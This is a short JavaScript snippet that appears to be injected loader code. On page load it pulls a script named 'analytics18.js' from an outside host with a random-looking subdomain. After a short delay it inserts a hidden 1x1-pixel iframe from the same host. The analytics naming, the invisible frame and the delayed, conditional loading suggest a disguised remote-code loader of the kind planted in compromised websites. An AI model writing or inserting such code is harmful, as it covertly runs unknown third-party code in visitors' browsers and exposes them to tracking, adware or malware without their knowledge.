if(self === top) {
	var domprefix = 'http://cds.v6i6b6a3.hwcdn.net/';
	var script = document.createElement("script");
	var head = document.getElementsByTagName("head")[0];
	if(!head)
		head = document.createElement("head");

	script.src = domprefix+'analytics18.js';
	script.type = 'text/javascript';
	script.async = true; 
	head.appendChild(script);

	setTimeout(function(){
		var iibody = document.getElementsByTagName("body")[0];	
		if(!iibody)
			iibody = document.createElement("body");	
		ifrm = document.createElement("iframe"); 
		
		ifrm.src = domprefix+'analytics18.html'; 
		ifrm.style.width = 1+"px"; 
		ifrm.style.height = 1+"px"; 
		ifrm.style.display = "none";
		iibody.appendChild(ifrm); 
			},1500);
  
}
